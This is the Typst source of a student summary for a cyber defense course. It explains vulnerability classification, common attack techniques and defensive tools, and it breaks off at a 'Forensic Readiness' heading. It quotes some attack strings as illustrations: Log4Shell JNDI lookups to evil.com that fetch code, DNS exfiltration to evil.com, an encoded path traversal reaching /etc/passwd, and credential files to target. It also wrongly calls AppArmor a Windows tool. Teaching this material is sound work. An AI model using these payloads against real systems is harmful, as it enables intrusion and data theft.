// Compiled with Typst 0.15.1
#import "../template_zusammenf.typ": *
#import "@preview/chronos:0.3.0"

#show: project.with(
  authors: ("Jannis Tschan", "Daniel S.", "Joëlle S.", "Nicolas C."),
  fach: "CyDef",
  fach-long: [Cyber Defense],
  semester: "HS25",
  language: "en",
  tableofcontents: (enabled: true, depth: 3, columns: 2),
)

// Import YARA syntax rules
#set raw(syntaxes: "yara.sublime-syntax")

#set figure(supplement: none)

#hinweis[
  *Hinweis:* Die Gliederung der Kapitel verläuft grob nach Unterrichtswochen, da aber Ivan gerne mal Themen hin und her
  geschoben hat, mussten einige Anpassungen vorgenommen werden, damit die Anordnung einigermassen sinnvoll blieb.
]

= Vulnerability Classification
#v(-0.5em)
== Common Vulnerability and Exposures (CVE)
_Common Vulnerability and Exposures (CVE)_ is a system for uniquely identifying vulnerabilities in _publicly released
software_. Every classified vulnerability receives a CVE ID in the form `CVE-YEAR-DIGITS`. The system is operated by
_MITRE Corporation_, with funding from the US Department of Homeland Security.

CVE's are assigned by _CVE Numbering authorities (CNAs)_. Usually, bigger tech companies are their own CNA. Open Source
Software can be assigned a CVE by their Code Forge service #hinweis[(e.g. GitHub, GitLab)] or by Red Hat #hinweis[(if
  the software is used in Red Hat products)].

=== CVE assignment process
#grid(
  [
    + Security researcher analyzes software and finds vulnerability
    + Vulnerability gets reported to the respective CNA
    + Vulnerability gets reviewed in a two-phase process by the CNA
  ],
  [
    4. After a successful review, a CVE ID is reserved
    + The required fields in the CVE record are filled out with information about the exploit
    + The CVE record is published
  ],
)

=== CVE Record
When a CVE gets published, the following information is included in the CVE record:
- _CVSS_: The severity of the vulnerability #hinweis[(see @cvss)]
- _State:_ "Reserved" #hinweis[(The initial state before publishing)], "Published" or "Rejected"
- _Description:_ A short description of what the vulnerability does
- _Affected Products and versions:_ Which products can be exploited by the CVE, including a range of affected version numbers.
  If updates for affected software is available, the patched versions are also included
- _Used CWEs:_ What CWEs the vulnerability falls into
- _References:_ Links to further resources, usually advisories on how to mitigate the vulnerability

== Common Weakness Enumeration (CWE)
_Common Weakness Enumeration (CWE)_ categorizes and classifies software and hardware vulnerabilities based on how they
exploit weaknesses in software. It does not list specific software, but the techniques used to exploit it.
It also contains possible mitigations for each weakness.

For example, the three most common CWEs in 2025 were:
+ CWE-119: Improper Restriction of Operations within the Bounds of a Memory Buffer
  #hinweis[(incorrect index/length checks)]
+ CWE-79: Cross-Site Scripting
  #hinweis[(Missing or incorrect neutralization of user input when generating web page content)]
+ CWE-20: Improper Input Validation

== Common Vulnerability Scoring System (CVSS) <cvss>
The _Common Vulnerability Scoring System (CVSS)_ assigns a vulnerability a score from 0 to 10 based on _how difficult to
exploit_ and _how much damage_ can be caused with it. The higher the resulting score, the more critical it is to remedy
the exploit. A score of 0.1 - 3.9 is considered "Low", 4.0 - 6.9 "Medium", 7.0 - 8.9 "High" and 9.0 - 10.0 "Critical".

The score in CVSS 4.0 is divided into multiple metrics:
- _Base:_ Characteristics of the vulnerability itself, technical assessment
- _Threat:_ Current state of exploit techniques or code availability for a vulnerability
- _Environmental:_ Characteristics that depend on a specific implementation or environment
  #hinweis[(i.e. impact on the affected organization)]
- _Supplemental:_ Measures external attributes of a vulnerability
  #hinweis[(safety of human life, attack is  self-replicable, recovery of the system after a attack,
    highly-valuable target affected, difficulty for consumers to respond to the vulnerability)]

#pagebreak()

The _base metrics_ of CVSS 4.0 are as follows:
#v(-0.5em)
#table(
  columns: (auto, 1fr),
  table.header([Metric], [Explanation]),
  [*Attack Vector\ (AV)*],
  [
    In what physical way can it be exploited?\
    #hinweis[
      (_Network_ (over the internet),
      _Adjacent_ (only "in reach" of e.g. Wi-Fi, Bluetooth),
      _Local_ (accessing system via mouse/keyboard, remote tools such as SSH or social engineering),
      _Physical_ (manipulation of physical machine))
    ]
  ],

  [*Attack Complexity\ (AC)*],
  [Are there any further counter measures the attacker has to circumvent, and how hard is it to do so?],

  [*Attack Requirements\ (AT)*],
  [
    Are there any conditions necessary for an attack which the attacker cannot influence?
    #hinweis[(System must be in a certain state, race condition must be won, etc.)]
  ],

  [*Privileges Required\ (PR)*],
  [
    Is it required to have any privileges on the target system?\
    #hinweis[(_None_ (unauthenticated), _some_ (regular user), _high_ (admin access))]
  ],

  [*User Interaction\ (UI)*],
  [
    Does the user on the target need to do anything to make the attack possible?\
    #hinweis[(_None_, _passive_ (e.g. accidentally visiting a web site), _active_ (e.g. placing files in a specific directory)]
  ],

  [*Vulnerable System CIA\ impact (VC, VI, VA)*],
  [Whether the target system is impacted in _Confidentiality_, _Integrity_ or _Availability_],

  [*Subsequent System\ CIA impact (SC, SI, SA)*],
  [Whether any other systems except the targeted one are impacted in _Confidentiality_, _Integrity_ or _Availability_],
)

== OWASP Top 10
The _Open Web Application Security Project (OWASP)_ is a nonprofit foundation that aims to improve the security of
(web) software. Every year, it publishes the ten most abused web vulnerabilities. The Top 10 of 2025 are:

#grid(
  [
    + Broken Access Control #hinweis[(User accesses or modifies information they shouldn't be able to)]
    + Security Misconfiguration #hinweis[(unnecessary ports enabled, default credentials, security features disabled)]
    + Software Supply Chain Failures #hinweis[(Vulnerabilities in used libraries)]
    + Cryptographic Failures #hinweis[(Bad encryption used, personal data not encrypted)]
    + Injection #hinweis[(XSS, SQL injection, command injection...)]
  ],
  [
    6. Insecure Design #hinweis[(Bad business logic, missing validation)]
    + Authentication Failures #hinweis[(Attacker can log in as other user, hard coded credentials)]
    + Software or Data Integrity Failures #hinweis[(No verification of external resources, e.g. checksums of downloads)]
    + Security Logging and Alerting Failures #hinweis[(Events not logged, sensitive data in logs, no alerts on unusual behavior)]
    + Mishandling of Exceptional Conditions #hinweis[(Unexpected/Error conditions lead to crashes or undefined behavior)]
  ],
)

== ASVS Controls
The _Application Security Verification Standard (ASVS)_ is a project by OWASP to provide developers with security
measures (_"controls"_) that are testable.

Why is ASVS needed if OWASP Top 10 exists? The OWASP Top 10 is for awareness only, it is not written for developers.
While OWASP Top 10 highlights what risks exist, ASVS provides concrete guidance how to prevent them, acting as a
comprehensive guide for development, testing, and procurement (benchmarking).

ASVS compliance is split into multiple levels:
- _Level 1 (136 controls):_ Minimum acceptable assurance, easy to automate
- _Level 2 (267 controls):_ The recommended level. Includes secure software development life cycle and architecture,
  most are testable via unit / integration tests
- _Level 3 (286 controls):_ Defense-in-depth mechanisms or other hard-to-implement controls for highly reliable
  applications #hinweis[(medical, power station controls etc.)]

#pagebreak()

== Traffic Light Protocol (TLP)
The _Traffic Light Protocol_ has been developed by security researchers to _signal the confidentiality_ of information.
It is often used when sensitive information is presented, like details of an attack against a company during a
(cross-organizational) meeting or a conference.

Different parts of a document can have different TLP levels: The names of affected users of an exploit can be TLP:RED,
while details about how the attacker got access can be TLP:CLEAR.

#table(
  columns: (auto, 1fr),
  table.header([Level], [Description]),
  text(fill: red, highlight(fill: black)[*TLP:RED*]),
  [Information restricted to current participants of the meeting/presentation. Sharing strictly forbidden],

  text(fill: orange, highlight(fill: black)[*TLP:AMBER*]),
  [Information can be shared within the organization of the receiver only if strictly necessary],

  text(fill: green, highlight(fill: black)[*TLP:GREEN*]),
  [Information can be freely shared within the organization and its partners, but may not be released publicly],

  text(fill: white, highlight(fill: black)[*TLP:CLEAR*]),
  [Information can be freely shared with the public. Previously called TLP:WHITE.],
)

= Hacking Attacks
Hacking attacks can target different layer of a system: The OS, the network stack, the services #hinweis[(e.g. Tomcat)]
or the applications running on it. For reconnaissance, attackers use _scanners_ to check targets for vulnerabilities:
Port scanners #hinweis[(e.g. `nmap`)], TLS testers #hinweis[(e.g. Qualys SSL Test)] or vulnerability scanners
#hinweis[(e.g. Nessus)]. More than 90% of all vulnerabilities lie on the application-level, the rest lies below.

Hacks can be conducted over IT systems or over humans. Direct attacks of the IT systems are often difficult to execute,
so it can be easier to target the actual humans in an attack, e.g. through Phishing or Social Engineering.

== Attack types
#v(-0.5em)
=== Local exploit
_Local exploits_ are attacks executed on a target the _attacker has already compromised_ and can run code and commands on.
The attacker now wants to execute their code with higher privileges
#hinweis[(e.g. Windows: Regular User $->$ Local Admin $->$ `SYSTEM` user, Unix: User $->$ root)].
This is called _privilege escalation_.

*Privilege Escalation under Unix systems:*
#v(-0.5em)
- _suid:_ A program on a Unix system normally runs with the same permissions as the user who started it. However, if the
  `suid` bit is set in the permissions of the binary, the program _runs with the owner's permissions_.
  The most well known programs with `suid` are _`su`_ and _`sudo`_. Programs with `suid` are often targeted by attackers, as
  compromising them can give complete control of the system.
  #v(-0.25em)
  ```sh
  $ ls -la /bin/sudo
  -rwsr-xr-x 1 root root 257136 14. Aug 17:41 /bin/sudo  # 's' = suid bit. sudo is ran as root.

  ```

- _Cron Jobs:_ Cron jobs are a way to run scripts and programs on a schedule #hinweis[(every 15 minutes, hourly etc.)].
  If the target of a cron job #hinweis[(e.g. a shell script)] has _write permissions for everyone_, any user can modify
  that script and execute their own commands with the permissions of the user set in the cron job.
  If no user is specified in the cron job, it is ran as `root`. Below is a vulnerable cron job without a user that points
  to a script writable by anyone.
  #v(-0.25em)
  ```tab
  0 2 * * 0 /opt/backup.sh # no user set, ran as root. "backup.sh" has "-rw-rw-rw-" permissions
  ```

- _Bad file permissions:_ It is also possible to escalate privileges indirectly by reading files containing sensitive
  information with poorly configured permissions #hinweis[(read permissions for world/everyone)]. The most interesting
  files on a Unix system are listed below. With their contents, the attacker may be able to log into another server with
  SSH or modify passwords to log in as another user.
  #v(-0.5em)
  #table(
    columns: (1fr, 1fr),
    table.header([System files], [User configuration in `/home` or `/root`]),
    [
      - _`/etc/passwd`:_ Lists all users on the system
      - _`/etc/shadow`:_ Hashed passwords of users that may be crackable with "John the Ripper"
    ],
    [
      - _`.bash_history`:_ Command history, may contain login data that has been typed into the console
      - _`.ssh/id_rsa`:_ Private key(s)
    ],
  )

*Privilege Escalation under Windows:*
- _DLL Hijacking:_ By replacing DLLs loaded by applications, the attacker may be able to gain higher privileges.
  See chapter @dll-hijacking

=== Server-Side/Remote exploit
The attacker can directly interact with server software on a target host and wants to execute their own code on it
i.e. trigger a remote code execution vulnerability in the program. Common targets include:

#table(
  columns: (auto, 1fr, 1fr),
  table.header([Service], [Why is it a worthwhile target?], [Susceptible to]),
  [*FTP*],
  [Often runs with elevated privileges to manage file permissions],
  [Buffer overflows in command parsing, path traversal, authentication bypasses],

  [*DNS*],
  [Must remain publicly accessible. Compromising DNS can enable MitM-attacks or service disruptions in the entire network],
  [Buffer overflows in query parsing, Cache poisoning #hinweis[(Mitigated with DNSSEC)], Zone transfer vulnerabilities],

  [*Web\ server*],
  [
    Big attack surface, often connected to databases and other internal systems. A compromised web server can be used
    for further activity #hinweis[(mining, set up scam websites from a trusted domain, botnet)]
  ],
  [
    Remote file inclusion, path traversal, insecure processing of HTTP headers, flaws in TLS encryption implementation,
    flawed user input validation
  ],
)

=== Client-Side Exploit
The attacker wants to execute code on a client computer. The easiest method to run your code on a client machine is via
the browser: JavaScript, WebAssembly, WebGL, image files with embedded code...\
But there are also other programs that download resources from the internet that can be tricked into downloading malicious
files #hinweis[(e.g. registering an expired domain, modifying a resource where the checksum is not validated)].

== Attack methods
This chapter lists all the attacks that we only examined briefly during lectures. The rest of the chapter provides
more detailed descriptions of some of these attacks.

- _Man-in-the-Middle:_ An attacker inserts themselves into communications of two parties. The attacker can read all
  exchanged messages and send modified messages to the parties. Usually performed with _ARP Spoofing_ or a _reverse
  proxy_. See chapter @mitm

- _Man-in-the-Browser:_ A trojan that places itself in the browser #hinweis[(malicious add-on)] and modifies web pages
  on the client side #hinweis[(e.g. a bank transaction can look correct to the user, but the MitB-attack intercepted the
    request and changed the receiver of the money)]

- _Indirect Attack:_ The attacker doesn't attack the target directly, but instead attacks a user or infrastructure
  that accesses the desired target legitimately. Once the attacker has compromised that intermediate, it can use the
  existing trust relationship to access the target.

- _Social Engineering Attack:_ The attacker poses as someone trustworthy #hinweis[(e.g. support of a web service,
    another employee)] to trick the user into giving access, information, or performing actions that compromise
  security.

- _Command & Control (C2):_ With C2, the program executed on the target does not perform any malicious activities on its
  own. Instead, it contacts an attacker-controlled C2 server that provides further instructions
  #hinweis[(download malware, exfiltrate data, do nothing)]. Botnets are controlled via C2 servers.

- _Path Traversal Attack:_ Usually exploited on web servers. Uses the "`../`" pattern in the URL to go one directory up.
  If the server is badly configured, the attacker can access files in the parent directories #hinweis[(e.g.
    `ost.ch/uploads/../../../etc/passwd`)]. Note that a simple pattern matching filter is often not sufficient, as the
  `../` pattern can be _double encoded_ in URL Encoding: `%` $=>$ `%25`, `/` $=>$ `%5C`. So with "`%255C..%255C..`",
  simple pattern matching can be defeated.

- _URL Redirection:_ Some websites enable redirecting to another website via a query parameter. For example
  `https://www.google.com/url?q=github.com` will directly direct to GitHub. If the attacker chains multiple websites
  together, it can look like a regular link to Google, but it will redirect to a attacker-controlled site.

== Remote Access Trojan (RAT) & Remote Code Execution (RCE) <rat-rce>
_Remote Code Execution (RCE)_ is considered to be the "holy grail" of exploits, as it allows an attacker to run any code
they want and is thus the gateway to gain further control over other infrastructure. An RCE is often used as initial access
vector and can be achieved through various means: _Command Injection_, _Execution of uploaded files_, _SQL Injection_,
_Buffer Overflows_...

It's common for initial exploit payloads to be _"single-use"_: They execute once and then the process crashes or the
context ends. Shells can be used to interactively execute commands and keeping the context on the system. These are
categorized as _Remote Access Trojans (RAT)_ #emoji.mouse: Programs that allow full control of a machine over a remote
connection. They are used for long-term access; used as a backdoor after the hacker has gained control of a system.

=== Web Shell
#grid(
  align: horizon,
  [
    A web shell is a type of malware that gets installed on a web server to facilitate shell access for the attacker.
    The attacker _uploads the web shell_ #hinweis[(usually in the language that the server is built on, e.g. PHP)]
    to the server. Due to improper configuration, the _web shell's code is executed_ when the attacker performs a _`GET`
    request_ on the file. The attacker can then interact with the web shell's features, which can be used for data
    theft, DDoS attacks or other attacks on the server.

    A web shell always _communicates over HTTP_ and runs as the _web server user_.
  ],
  image("img/web-shell.png"),
)

=== Bind Shell <bind-shell>
#grid(
  align: horizon,
  [
    A bind shell provides remote access to another machine by _starting a listener on a network port_ on the victim.
    The attacker can then _connect directly to that port_ and access the web server's shell to execute commands.

    Often, the attacker already needs some kind of access to the victim in order to either start a tool like _`netcat`_
    or upload their own bind shell program. They also need to know the address of the server and the port on which the
    bind shell is running on.

    Communication happens on a _separate port_ and can thus be _blocked by firewalls_. Bind shells are therefore mostly
    used in _intranets_ where no firewall is present.
  ],
  image("img/bind-shell.png"),
)

=== Reverse Shell <reverse-shell>
#grid(
  align: horizon,
  [
    A reverse shell is the _opposite of a bind shell_: The attacker creates a listener on a port, while the victim
    connects to the attackers port. Just like the bind shell, the attacker now has shell access on the server.

    The attacker also needs some method of initializing the connection from the victim's side #hinweis[(already existing
      exploit, social engineering etc.)]. The advantages are that the IP and port to connect to are controlled by the
    attacker and that the server creates a _outbound connection_, which are usually _not blocked by firewalls_.
    Often used by APTs and ransomware.
  ],
  image("img/reverse-shell.png"),
)

== Ransomware
Ransomware is a type of malware that encrypts data on target systems. Often, the attacker will demand payment in
exchange for a decryption key. Although it is usually recommended not to pay the ransom, the _attacker will typically
provide a decryption method_ after receiving payment. This is because if the attacker are known not to provide one,
_no one will pay them anymore_ in future attacks.

Backup systems are critical in restoration after a ransomware attack. Central backup software usually operates in one of
two ways:
- _Push principle:_ The clients trigger the backup job and write their data directly to the backup server, thus
  requiring write access on it. Usually requires inbound rules on the firewall.
- _Pull principle:_ The backup server initializes the backup job and connects to the clients to create the backup. It
  only requires read-only access to the clients. Doesn't require inbound firewall rules.

In the event of a ransomware attack, the push principle means that an infected client could, in the worst case,
_compromise the entire backup server_. With the pull model, however, only the _backups of the affected client_
created after the infection can be corrupted.

== DNS tunneling
DNS tunnelling is an attack where DNS queries are abused to transfer data with them. This is done to hide the traffic
from WAFs and other defense mechanisms.

#grid(
  columns: (1fr, auto),
  [
    A specific attack using DNS tunneling is a _DNS data exfiltration_ attack, which smuggles data out of a network.

    + A file is Base64 encoded and the resulting hash split into small chunks
      #hinweis[(usually $<$ 512 bytes, as firewalls block larger DNS queries)].
    + Send a DNS query to an attacker-controlled domain with the chunk used as a subdomain.
    + Repeatedly send requests. Each fragment is then used as a subdomain
    + The attacker can concatenate all subdomains from that client's DNS requests to get the full Base64-encoded file contents.

    Note that this can also be done in reverse: e.g. a C2 server sends commands via DNS tunneling to an infected client.
  ],
  chronos.diagram({
    import chronos: *
    _par("Victim")
    _par("DNS", display-name: align(center)[Local DNS])
    _par("Attacker", display-name: align(center)[Attacker DNS\ (`evil.com`)])

    _seq("Victim", "Victim", comment: [Base64 hash of file:\ #tcolor("grün")[`1234ABC`]#tcolor("rot")[`5678DEF=`]])
    _seq("Victim", "Attacker", comment: [IP of #tcolor("grün")[`1234ABC`]`.evil.com`?])
    _seq("Attacker", "Victim")
    _seq("Victim", "Attacker", comment: [IP of #tcolor("rot")[`5678DEF=`]`.evil.com`?])
    _seq(
      "Attacker",
      "Attacker",
      comment: [Concatenate:\ #tcolor("grün")[`1234ABC`]#tcolor("rot")[`5678DEF=`]],
      flip: true,
    )
  }),
)

DNS tunneling _works slowly_ due to the small size sent with every DNS request. Monitoring tools may also pick up on it
if the queries are sent in quick succession.

=== Prevention
With a _split-horizon DNS_, the download of data via DNS responses can be prevented. In a split-horizon setup, there
are two DNS servers within the network: One that can be reached directly, but only resolves intranet addresses.
The other resolves regular internet traffic, but can only be reached through a proxy, as it sits in the DMZ.

While a split-horizon DNS _can't prevent DNS tunnel exfiltration_ as shown above, _it can prevent data downloading_ via
DNS tunneling. DNS data downloading is usually done by placing the malicious data in the _"Authority"_ or _"Additional"
section_ of a DNS response. This data is usually not trusted. As such, the proxy in the DMZ _does not forward this data_
to the client, thus preventing the attack.

The same principle also applies to _DNS over HTTPS_: The DoH server doesn't forward this additional data to the client.

== Cross-Site Scripting (XSS)
Cross-Site Scripting is an attack in which a vulnerable web application is used to _execute attacker code_ on the victim.
Note that XSS is not Remote Code Execution #hinweis[(see chapter @rat-rce)], as the code stays within the confines of the
browser sandbox.

There are three types of XSS:
- _Stored XSS:_ The malicious code is stored in the website #hinweis[(e.g. `<script>` tags in user-created posts)],
  sent to the victim on loading the website and then executed by the victim's browser
- _Reflected XSS:_ Some input #hinweis[(URL parameter, form entry etc.)] is sent to the server and the server responds
  with the parsed and unvalidated input embedded into the response HTML.
- _DOM-based XSS:_ Code is injected into the DOM at runtime, for example through a JS function that adds unvalidated
  input to the DOM. The difference to the other types is that the malicious code is not contained in the response from
  the server, but _dynamically added on the client_.

#grid(
  columns: (1fr, auto),
  [
    Reflected XSS are the most common type. The classic example is a search bar where the term entered is placed
    directly in the DOM without any escaping. The example below works similarly.

    + The attacker fills out a form that generates a URL with parameters. Within the fields, the XSS payload is placed.
    + The URL with the XSS in the parameters is created. The attacker either recieves the URL directly or catches the
      network request with developer tools
    + The attacker sends the URL to their victim
    + The victim opens the URL and due to the missing or broken validation, the code within the URL is parsed and
      executed
    + Depending on the payload, the attacker might exfiltrate some data #hinweis[(e.g. Cookies)] or do other damage
      to the victim

  ],
  chronos.diagram({
    import chronos: *
    _par("Attacker")
    _par("Victim")
    _par("App", display-name: [App with XSS])

    _seq("Attacker", "App", comment: [Place XSS code into\ vulnerable parameter])
    _seq("App", "Attacker", comment: [Receive URL with XSS code])
    _seq("Attacker", "Victim", comment: [Send URL])
    _seq("Victim", "App", comment: [Open URL])
    _seq("App", "Victim", comment: [XSS executes])
    _seq("Victim", "Attacker", comment: [Data exfiltration])
  }),
)


*Counter measures:* Input validation on the server, Convert user input into HTML entities,
set a Content Security Policy #hinweis[(so JS can only access cookies from the current domain)],
use the `Set-Cookie: HttpOnly` HTTP header #hinweis[(avoids leaking cookies through JS altogether)].

== DLL Hijacking <dll-hijacking>
#grid(
  columns: (1fr, auto),
  [
    When a program on Windows requests to load a DLL and doesn't specify a full path, Windows searches for them in a
    specific order. Most crucially, the _application's directory is searched before the system directory_. So if a
    program requests a system DLL #hinweis[(or a DLL not present on the system)], an attacker can place a malicious DLL
    with the same name and methods in the application directory and Windows will load and execute that code. Depending
    on the environment, it is possible to get privilege escalation.

    During an attack, an Attacker could send a program to a victim that drops a malicious DLL in the application
    directory of a vulnerable program. Programs located in `%APPDATA%` or `%LOCALAPPDATA%` are preferred to programs in
    `C:\Program Files`, as the latter requires admin permissions to write to. Once the victim starts the vulnerable
    program, the malicious DLL is loaded and executed.

    *Counter measures:* Patch program #hinweis[(hard-code DLL path)], set up EDR rules #hinweis[(AppArmor on Windows)],
    Firewall rules to block reverse shell activity.
  ],
  chronos.diagram({
    import chronos: *
    _par("Attacker")
    _par("Victim", display-name: [Windows Client])

    _seq("Attacker", "Attacker", comment: [Create malicious DLL])
    _seq("Attacker", "Victim", comment: [Social Engineering\ (Spam mail etc.)])
    _seq("Victim", "Victim", comment: [Run program that\ drops DLL], flip: true)
    _seq("Attacker", "Victim", comment: [Motivate victim to start\ program that loads DLL])
    _seq("Victim", "Victim", comment: [Starts program,\ malicious DLL loaded], flip: true)
    _seq("Victim", "Attacker", comment: [e.g. Reverse Shell])
  }),
)

== Advanced Persistent Threat (APT)
_Advanced Persistent Threats (APT)_ are well-equipped hacking groups with sheer limitless resources, usually
state-funded. They execute large-scale, targeted attacks on organizations and governments that are often politically
motivated by the governments behind them. They create their malware in-house, often on top of unknown zero-day exploits.
The time frame from initial infection up to discovery can last years, as they usually move slowly and have multiple
backdoors into targets.

An APT attack usually goes through the following phases, each can last months or years:
#grid(
  [
    + Infection
    + Persistence
    + Exfiltration
  ],
  [
    4. Privilege Elevation
    + Further Exfiltration with new privileges
    + Increase network access
  ],
)

=== Example APT-style attack with C2
#align(center)[
  #chronos.diagram({
    import chronos: *
    _par("Attacker")
    _par("C2")
    _par("Firewall")
    _par("Target")

    _seq("Attacker", "Target", comment: [Phishing mail with download link])
    _seq("Attacker", "Target", comment: [Downloads legitimate software with C2 functionality,\ no malware activity yet])
    _seq("Target", "C2", comment: [Software checks for "updates"])
    _seq("C2", "Target", comment: [Sends command "Sleep for 90 days"])
    _seq("Target", "C2", comment: [Another "update" check after 90 days])
    _seq("C2", "C2", comment: [Condition met], flip: true)
    _seq("C2", "Target", comment: [Send malware code])
    _seq("Target", "Target", comment: [Execute,\ gain local admin], flip: true)
  })
]

=== Patch Gap
When a vulnerability gets discovered, there is often an exploit available before a patch is applied to all clients. The
time between these two dates is called the _Patch Gap_, and is what APTs rely on.

*Example:* 6 days after the release of a patch, an exploit has been reverse-engineered from the patch. But the patch is
only applied to all clients after 54 days, making the patch gap 48 days long.

=== APT detection
The most basic detection is simply using _lookup lists_ at the intranet exit point. Scan for known malicious
IPs/domains/email addresses. This of course only works against well-known malware that has been identified before.

The second level uses content inspection and _dynamic analysis_ to discover new threats. The latter works by intercepting
downloads and e-mail attachments and running them on sandbox infrastructure. In this way the behavior of executables can
be observed: Contacted domains, requested URLs, suspicious behavior, etc.\
This is combined with _content inspection:_ By inspecting all network traffic in the network, the detection can also
spot _DNS query patterns_, _HTTP characteristics_, _firewall traversals_, _Email behavior_ and _suspicious background
traffic_.

These indicators can then be compared on databases such as _Block&Black_, _Mandiant_, _Zeus Tracker_, _Malware Hash_ or
_OpenIoC_. Note that this is no silver bullet: _Sandbox-aware_ or _memory-only_ malware, abuse of legitimate tools or
long-term low-volume attacks with little to no artifacts can still not be detected this way.

== Famous exploits
#v(-0.5em)
=== Log4Shell (CVE-2021-44228)
#grid(
  columns: (1fr, auto),
  [
    Log4Shell is an RCE exploit in the Apache Log4j logging library with a _10.0 CVSS_. Log4j allowed requests to
    arbitrary LDAP servers and to _execute arbitrary Java code_ on them. Including the string `${jndi:ldap://example.com/virus.jar}`
    into some input logged by Log4j #hinweis[(e.g. HTTP Headers, Minecraft chat messages)] would download
    and execute `virus.jar`.

    *Mitigations*
    - Patch the program containing Log4j
    - Disable the LDAP lookup feature
    - WAF rules for the attacking string
    - Outgoing traffic firewall rule
  ],
  chronos.diagram({
    import chronos: *
    _par("Attacker")
    _par("C2")
    _par("fw", display-name: "Firewall")
    _par("WAF")
    _par("target", display-name: "Vulnerable System in DMZ")

    _seq("Attacker", "target", comment: [Exploit: `${jndi:ldap://evil.com/file}`])
    _seq("Attacker", "WAF", comment: [Exploit blocked if WAF\ has Log4j detection rule], dashed: true)
    _seq("target", "target", comment: "RCE, code runs", flip: true)
    _seq("target", "C2", comment: "Send request to fake LDAP server")
    _seq("C2", "target", comment: "Send malware")
    _seq("target", "target", comment: "Execute malware", flip: true)
  }),
)

=== Cisco ASA Vulnerabilities
In September 2025, two zero-day exploits on Ciscos ASA firewall were actively and heavily exploited in the wild:
- CVE-2025-20333: RCE due to improper input validation in authenticated HTTP requests (CVSS 9.9)
- CVE-2025-20362: Authentication bypass to access remote VPN endpoints (CVSS 8.6)

The first exploit allowed Remote Code Execution, but required to already be logged into the firewall. But it could
easily be _chained_ with the second one to bypass the login and acquire an authenticated session.

#grid(
  columns: (1fr, auto),
  [
    *Exploit execution steps*
    + Send exploit that bypasses authentication with CVE-2025-20362 and then creates a buffer overflow with
      CVE-2025-20333. RCE activated!
    + Install the "RayInitiator" rootkit in GRUB for persistence
    + Install the "Line Viper" Shellcode loader to create encrypted communication with the C2 server
      #hinweis[(detection evasion)]
    + Connect to C2 via WebVPN (the firewalls VPN feature)
    + Send commands back to the firewall
    + Use the control of the firewall to access the intranet
    + Data exfiltration, ransomware campaign etc.
  ],
  chronos.diagram({
    import chronos: *
    _par("Attacker")
    _par("C2")
    _par("Cisco FW")
    _par("Intranet")

    _seq("Attacker", "Cisco FW", comment: [Send exploit, chaining both CVEs])
    _seq("Cisco FW", "Cisco FW", comment: [Install Rootkit])
    _seq("Cisco FW", "Cisco FW", comment: [Install Shellcode loader])
    _seq("Cisco FW", "C2", comment: [Connect via Cisco VPN])
    _seq("C2", "Cisco FW", comment: [Send C2 commands])
    _seq("Cisco FW", "Intranet", comment: [Use FW control to access])
    _seq("Intranet", "C2", comment: [Steal data. Profit!])
  }),
)


= Defense Mechanisms
#v(-0.5em)
== Web Application Firewall (WAF) <waf>
#grid(
  columns: (1fr, auto),
  [
    A _web application firewall (WAF)_ can prevent attacks on the application level such as shell attacks. They analyze
    the HTTP traffic and allow or block it based on their rule sets.

    To analyze HTTPS traffic, WAFs use _TLS termination/TLS inspection:_ When the client makes a HTTPS request, a
    connection is first established from the client to the WAF and then to the target server. This creates _two
    different HTTPS connections_. Because the connection is terminated at the WAF, it can inspect requests and
    responses. If the packet contents are deemed clean, they are re-encrypted and sent to their destination. The WAF
    therefore acts as a _(legitimate) Man-in-the-Middle_.

  ],
  chronos.diagram({
    import chronos: *
    _par("Client")
    _par("WAF")
    _par("Server")

    _seq("Client", "WAF", comment: [TLS Handshake with WAF\ `GET https://ost.ch`])
    _seq("WAF", "WAF", comment: [Decrypt, analyze, reencrypt])
    _seq("WAF", "Server", comment: [TLS handshake with server,\ forward request from client])
    _seq("Server", "WAF", comment: [`200 OK`], comment-align: "right")
    _seq("WAF", "WAF", comment: [Decrypt, analyze, reencrypt], flip: true, comment-align: "right")
    _seq("WAF", "Client", comment: [Send web page over\ original connection])
  }),
)

Normally, the client would receive an _HTTP warning_ about certificates not matching. The client expects the certificate
to be signed by the server #hinweis[(or the server's CA)], but due to the re-encryption, it is signed by the WAF.
To avoid these warnings and ensure working connections, the administrator needs to install the root certificate of the
WAF as a _Trusted Root Certification Authority_ on _all clients in the network_.

*Considerations:*
- _WAFs cannot break TLS encryption_, so they have to terminate the existing one and establish a new connection instead
  of being able to analyze an existing connection.
- With TLS termination, the WAF can see data such as the _URL query parameters_ #hinweis[(ost.ch/api?*token=mytoken*)].
  Without it, a MitM attacker or WAF would only see the hostname of the request.
- _WAFs can only analyze HTTP(S) traffic_. If content analysis of other protocols is needed, an _inspection proxy_ can
  be used #hinweis[(e.g. Burp, Zap)]. It can also perform TLS termination/inspection.
- _Perfect Forwarding Secrecy (PFS)_ is not affected by correctly configured TLS termination.
  #hinweis[(See chapter @downgrading-encrypted-traffic)]

#table(
  columns: (1fr, 1fr, 1fr),

  table.header([Regular Firewall], [Web Application Firewall], [Inspection Proxy]),
  [
    Who is allowed to communicate with whom? Creation of traffic routes. No content analysis.\
    Works on OSI Layer 3 and 4
  ],
  [
    Inspection of HTTP traffic, blocked or allowed based on rule sets.\
    HTTPS analysis with TLS termination. Works on OSI Layer 7
  ],
  [
    Inspection of all traffic, not just HTTP(S). Terminates TLS if needed. Works on OSI Layer 5-7.
  ],
)

Inside of the network, regular firewalls, WAFs and proxies can't interfere. An attacker can therefore execute attacks
more efficiently if they are inside the intranet.

== Microsoft SmartScreen
Microsoft SmartScreen is a security feature in Windows that helps protect users from malicious software and websites
accessed over the browser. It checks downloaded files and visited URLs against a _reputation database_. It has two types
of checks:
- Checks if it is on a list of files that are _well known_ and downloaded frequently. If the file isn't on that list,
  SmartScreen shows a warning, advising caution.
- Checks if it is on a list of reported malicious software sites and programs _known to be unsafe_. If it finds a match,
  it displays a warning that the file may be malicious.

== Fraud Detection
To detect fraudulent behavior, a lot of data is needed. For example, to detect fraud in an E-Banking application,
usually _technical details from the current and previous session_ #hinweis[(User agent, IP, time, browser fingerprint,
  average login duration...)] and _details of current and previous transactions_ #hinweis[(amount, virgin payment,
  beneficiary, transfer to which bank...)] are compared. If there's something unusual, the bank can step in.
Depending on how many indicators are triggered, the bank can require more stringent verification of the transaction:
+ Automatic authorization, no action required from customer
+ Authorize transaction with 2FA
+ Bank calls the customer to verify that they are not getting scammed

A man-in-the-browser attack is also likely. The banking website can utilize Clickstream analysis
#hinweis[(Behavior of the user on the page)], Outliner Detection, Keystroke typing speed and URL frequency analysis.

== Forensic Readiness
#grid(
  columns: (1fr, auto),
  [
